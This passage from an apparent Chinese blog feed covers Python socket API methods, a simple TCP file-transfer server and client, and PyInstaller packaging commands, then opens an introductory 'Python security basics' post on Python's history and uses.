style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">s.connect()</td>\n<td style=\"text-align:left\">主动初始化 TCP 服务器连接，。一般 address 的格式为元组（hostname,port），如果连接出错，返回 socket.error 错误。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">s.connect_ex()</td>\n<td style=\"text-align:left\">connect () 函数的扩展版本，出错时返回出错码，而不是抛出异常</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">公共用途的套接字函数</td>\n<td style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">s.recv()</td>\n<td style=\"text-align:left\">接收 TCP 数据，数据以字符串形式返回，bufsize 指定要接收的最大数据量。flag 提供有关消息的其他信息，通常可以忽略。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">s.send()</td>\n<td style=\"text-align:left\">发送 TCP 数据，将 string 中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于 string 的字节大小。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">s.sendall()</td>\n<td style=\"text-align:left\">完整发送 TCP 数据。将 string 中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回 None，失败则抛出异常。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">s.recvfrom()</td>\n<td style=\"text-align:left\">接收 UDP 数据，与 recv () 类似，但返回值是（data,address）。其中 data 是包含接收数据的字符串，address 是发送数据的套接字地址。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">s.sendto()</td>\n<td style=\"text-align:left\">发送 UDP 数据，将数据发送到套接字，address 是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">s.close()</td>\n<td style=\"text-align:left\">关闭套接字</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">s.getpeername()</td>\n<td style=\"text-align:left\">返回连接套接字的远程地址。返回值通常是元组（ipaddr,port）。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">s.getsockname()</td>\n<td style=\"text-align:left\">返回套接字自己的地址。通常是一个元组 (ipaddr,port)</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">s.setsockopt(level,optname,value)</td>\n<td style=\"text-align:left\">设置给定套接字选项的值。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">s.getsockopt(level,optname[.buflen])</td>\n<td style=\"text-align:left\">返回套接字选项的值。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">s.settimeout(timeout)</td>\n<td style=\"text-align:left\">设置套接字操作的超时期，timeout 是一个浮点数，单位是秒。值为 None 表示没有超时期。一般，超时期应该在刚创建套接字时设置，因为它们可能用于连接的操作（如 connect ()）</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">s.gettimeout()</td>\n<td style=\"text-align:left\">返回当前超时期的值，单位是秒，如果没有设置超时期，则返回 None。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">s.fileno()</td>\n<td style=\"text-align:left\">返回套接字的文件描述符。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">s.setblocking(flag)</td>\n<td style=\"text-align:left\">如果 flag 为 0，则将套接字设为非阻塞模式，否则将套接字设为阻塞模式（默认值）。非阻塞模式下，如果调用 recv () 没有发现任何数据，或 send () 调用无法立即发送数据，那么将引起 socket.error 异常。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">s.makefile()</td>\n<td style=\"text-align:left\">创建一个与该套接字相关连的文件</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"socket文件传输\"><a class=\"anchor\" href=\"#socket文件传输\">#</a> Socket 文件传输</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#Server</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> socketserver</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> struct</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> re</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> json</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> struct</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">from</span> optparse <span class=\"token keyword\">import</span> OptionParser</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">sendFile</span><span class=\"token punctuation\">(</span>conn<span class=\"token punctuation\">,</span> head_info<span class=\"token punctuation\">,</span>head_info_len<span class=\"token punctuation\">,</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        conn<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>head_info_len<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        conn<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>head_info<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            conn<span class=\"token punctuation\">.</span>sendall<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[+]send success! '</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[-]send fail! '</span> <span class=\"token operator\">+</span> filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">operafile</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    filesize_bytes <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>getsize<span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    pattern <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">r'([^&lt;>/\\\\\\|:\"\"\\*\\?]+\\.\\w+$)'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    data <span class=\"token operator\">=</span> pattern<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    head_dir <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token string\">'filename'</span><span class=\"token punctuation\">:</span> data<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token string\">'filesize_bytes'</span><span class=\"token punctuation\">:</span> filesize_bytes<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    head_info <span class=\"token operator\">=</span> json<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>head_dir<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    head_info_len <span class=\"token operator\">=</span> struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">'i'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>head_info<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">return</span> head_info_len<span class=\"token punctuation\">,</span> head_info</pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">MyServer</span><span class=\"token punctuation\">(</span>socketserver<span class=\"token punctuation\">.</span>BaseRequestHandler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    buffsize <span class=\"token operator\">=</span> <span class=\"token number\">1024</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">handle</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[+]远程客户端ip地址：'</span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>client_address<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            filename <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'请输入要发送的文件名>>>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#移除字符串头尾指定的字符（默认为空格或换行符）或字符序列</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>filename <span class=\"token operator\">==</span> <span class=\"token string\">\"exit\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            head_info_len<span class=\"token punctuation\">,</span> head_info <span class=\"token operator\">=</span> operafile<span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            sendFile<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">,</span>head_info<span class=\"token punctuation\">,</span>head_info_len<span class=\"token punctuation\">,</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        self<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    parser <span class=\"token operator\">=</span> OptionParser<span class=\"token punctuation\">(</span><span class=\"token string\">\"Usage:%prog -p &lt;port> \"</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\"># 输出帮助信息</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    parser<span class=\"token punctuation\">.</span>add_option<span class=\"token punctuation\">(</span><span class=\"token string\">'-p'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">type</span><span class=\"token operator\">=</span><span class=\"token string\">'string'</span><span class=\"token punctuation\">,</span>dest<span class=\"token operator\">=</span><span class=\"token string\">'port'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">'specify targer port'</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\"># 获取 ip 地址参数</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    options<span class=\"token punctuation\">,</span>args <span class=\"token operator\">=</span> parser<span class=\"token punctuation\">.</span>parse_args<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    port <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>options<span class=\"token punctuation\">.</span>port<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+]listening at \"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    s <span class=\"token operator\">=</span> socketserver<span class=\"token punctuation\">.</span>ThreadingTCPServer<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyServer<span class=\"token punctuation\">)</span>  <span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    s<span class=\"token punctuation\">.</span>serve_forever<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token keyword\">except</span> KeyboardInterrupt<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"interrupted by user, killing all threads...\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#client</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> socket <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> json</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> struct</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">from</span> optparse <span class=\"token keyword\">import</span> OptionParser</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">recv_file</span><span class=\"token punctuation\">(</span>head_dir<span class=\"token punctuation\">,</span> tcp_client<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    filename <span class=\"token operator\">=</span> head_dir<span class=\"token punctuation\">[</span><span class=\"token string\">'filename'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    filesize <span class=\"token operator\">=</span> head_dir<span class=\"token punctuation\">[</span><span class=\"token string\">'filesize_bytes'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+]filename: \"</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+]filesize: \"</span><span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>filesize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    recv_len <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">while</span> recv_len <span class=\"token operator\">&lt;</span> filesize<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>filesize <span class=\"token operator\">></span> <span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            recv_mesg <span class=\"token operator\">=</span> tcp_client<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            recv_len <span class=\"token operator\">+=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>recv_mesg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>recv_mesg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            recv_mesg <span class=\"token operator\">=</span> tcp_client<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>filesize<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            recv_len <span class=\"token operator\">+=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>recv_mesg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>recv_mesg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    f<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[+]文件传输完成!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    parser <span class=\"token operator\">=</span> OptionParser<span class=\"token punctuation\">(</span><span class=\"token string\">\"Usage:%prog -u &lt;target address> -p &lt;port> \"</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\"># 输出帮助信息</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    parser<span class=\"token punctuation\">.</span>add_option<span class=\"token punctuation\">(</span><span class=\"token string\">'-u'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">type</span><span class=\"token operator\">=</span><span class=\"token string\">'string'</span><span class=\"token punctuation\">,</span> dest<span class=\"token operator\">=</span><span class=\"token string\">'ip'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">'specify targer ip'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 获取 ip 地址参数</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    parser<span class=\"token punctuation\">.</span>add_option<span class=\"token punctuation\">(</span><span class=\"token string\">'-p'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">type</span><span class=\"token operator\">=</span><span class=\"token string\">'string'</span><span class=\"token punctuation\">,</span>dest<span class=\"token operator\">=</span><span class=\"token string\">'port'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">'specify targer port'</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\"># 获取 ip 地址参数</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    options<span class=\"token punctuation\">,</span>args <span class=\"token operator\">=</span> parser<span class=\"token punctuation\">.</span>parse_args<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    target_port <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>options<span class=\"token punctuation\">.</span>port<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    target_ip <span class=\"token operator\">=</span> options<span class=\"token punctuation\">.</span>ip</pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    tcp_client <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">(</span>AF_INET<span class=\"token punctuation\">,</span> SOCK_STREAM<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># socket 初始化</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    ip_port <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>target_ip<span class=\"token punctuation\">,</span> target_port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    tcp_client<span class=\"token punctuation\">.</span>connect_ex<span class=\"token punctuation\">(</span>ip_port<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[+]等待服务端应答数据....'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    struct_len <span class=\"token operator\">=</span> tcp_client<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 接收报头长度</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    struct_info_len <span class=\"token operator\">=</span> struct<span class=\"token punctuation\">.</span>unpack<span class=\"token punctuation\">(</span><span class=\"token string\">'i'</span><span class=\"token punctuation\">,</span> struct_len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\"># 解析得到报头信息的长度</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+]接收头信息长度：\"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>struct_info_len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    head_info <span class=\"token operator\">=</span> tcp_client<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>struct_info_len<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    head_dir <span class=\"token operator\">=</span> json<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>head_info<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 将报头的内容反序列化</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+]输出头部信息内容：\"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>head_dir<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    recv_file<span class=\"token punctuation\">(</span>head_dir<span class=\"token punctuation\">,</span> tcp_client<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">except</span> KeyboardInterrupt<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"interrupted by user, killing all threads...\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"可执行文件的转换\"><a class=\"anchor\" href=\"#可执行文件的转换\">#</a> 可执行文件的转换</h2>\n<p>当开发者向普通用户分享程序的时候，为了方便用户在未安装 Python 环境的情况下能够正常运行，需要将为开发号的程序进行打包，转换成用户可执行的文件类型</p>\n<ul>\n<li>PyInstaller</li>\n<li>Py2exe</li>\n</ul>\n<p>上面是两种常见的打包工具，PyInstaller 打包的执行文件，只能在与执行打包操作系统的同类型环境下运行</p>\n<h3 id=\"pyinstaller安装\"><a class=\"anchor\" href=\"#pyinstaller安装\">#</a> PyInstaller 安装</h3>\n<pre><code>pip install pyinstaller\n</code></pre>\n<h3 id=\"win系统下的转换\"><a class=\"anchor\" href=\"#win系统下的转换\">#</a> win 系统下的转换</h3>\n<pre><code>pyinstaller -F -i ico文件 py文件\n</code></pre>\n<h3 id=\"linux下的转换\"><a class=\"anchor\" href=\"#linux下的转换\">#</a> Linux 下的转换</h3>\n<pre><code>pyinstaller -F py文件\n</code></pre>\n",
            "tags": [
                "Python",
                "Python"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/01/31/python%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/",
            "url": "https://blog.xcu.icu/2023/01/31/python%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/",
            "title": "Python安全基础",
            "date_published": "2023-01-30T16:00:00.000Z",
            "content_html": "<h2 id=\"概述\"><a class=\"anchor\" href=\"#概述\">#</a> 概述</h2>\n<p>诞生与 1989 年圣诞节期间，吉多・范罗苏姆为了打发时间，而决心开发一款作为 ABC（专门为非专业程序员设计的一种教学语言）的一个继承，与 1991 年发行第一个版本。</p>\n<p>python 的运用场景：</p>\n<ol>\n<li>人工智能\n<ul>\n<li>机器学习，神经网络，深度学习</li>\n</ul>\n</li>\n<li>云计算\n<ul>\n<li>开源云计算解决方案</li>\n</ul>\n</li>\n<li>大数据\n<ul>\n<li>数据分析，数据可视化，数据挖掘</li>\n</ul>\n</li>\n<li>网络爬虫\n<ul>\n<li>主流爬虫设计语言，Scrapy 框架</li>\n</ul>\n</li>\n<li>自动化维护\n<ul>\n<li>selenium</li>\n</ul>\n</li>\n<li>web 开发\n<ul>\n<li>web2py 框架</li>\n</ul>\n</li>\n<li>科学计算\n<ul>\n<li>NumPy，SciPy</li>\n</ul>\n</li>\n<li>常规软件开发\n<ul>\n<li>软件开发，脚本编写，网络编程</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"第一个python程序\"><a class=\"anchor\" href=\"#第一个python程序\">#</a> 第一个 python 程序</h2>\n<p>相比各位学 c 的第一个程序，应该都是打印一个”Hello World“了吧，那 python 的入门我们也从打印 “Hello World” 开始</p>\n<p>可以从我们的 dos 窗口来执行 python 代码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230126222928427.png\" alt=\"image-20230126222928427\" /></p>\n<p>当然也可以使用一些编译器如 PyCharm 或者 vscode 编写程序</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230126223140132.png\" alt=\"image-20230126223140132\" 